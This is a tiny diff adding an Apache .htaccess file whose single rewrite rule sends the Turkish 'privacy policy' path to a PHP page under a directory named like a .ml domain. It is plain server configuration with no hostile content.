@@ -1,0 +1,4 @@
+RewriteEngine on
+
+RewriteRule ^gizlilik-politikasi$ serveraurorax.ml/yoo/pol.php [NC]
+
